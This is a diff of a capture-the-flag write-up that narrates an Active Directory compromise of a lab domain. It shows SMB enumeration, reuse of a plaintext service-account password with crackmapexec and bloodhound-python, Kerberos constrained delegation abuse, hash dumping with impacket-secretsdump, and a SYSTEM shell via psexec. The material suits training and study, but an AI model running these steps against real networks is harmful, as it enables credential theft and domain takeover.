@@ -6,7 +6,7 @@
 
 ***
 
-TEST
+First , Let's use The `nmap` scan to check the which services is running .
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
@@ -16,7 +16,7 @@ sudo nmap -sV -sC -Pn 10.48.148.0 -T4
 
 <figure><img src="../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+We can see on the above image we got the smb port open `139,445` let's List The SMB services .
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
@@ -26,7 +26,7 @@ smbclient -L //10.49.187.70/ -N
 
 <figure><img src="../.gitbook/assets/image (946).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+Then check the content on the inside the services !&#x20;
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
@@ -36,7 +36,7 @@ smbclient //10.49.187.70/IT-Shared -N
 
 <figure><img src="../.gitbook/assets/image (947).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+File Server Running every 2 minutes .
 
 <figure><img src="../.gitbook/assets/image (949).png" alt=""><figcaption></figcaption></figure>
 
@@ -80,11 +80,21 @@ crackmapexec smb 10.49.187.70 -u svc.scanner -p '1summerlove!' --users
 
 <figure><img src="../.gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+I used The `bloodhound-python` with the valid credential .
 
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+sudo bloodhound-python -d ctf.local -u svc.scanner -p 1summerlove! -ns 10.49.187.70 -c all --zip
+```
+{% endcode %}
 
+<figure><img src="../.gitbook/assets/image (955).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+Kerberos Constrained Delegation (KCD) Abuse.
+
+<figure><img src="../.gitbook/assets/image (956).png" alt=""><figcaption></figcaption></figure>
+
+Kerberos Constrained Delegation (KCD) Abuse Attack.
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
@@ -100,7 +110,7 @@ export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
 ```
 {% endcode %}
 
-TEST
+Dump The hashes using `impacket-secretsdump` .
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
@@ -110,7 +120,7 @@ impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local
 
 <figure><img src="../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+Got The `SYSTEM` level shell using a `impacket-psexec` .
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
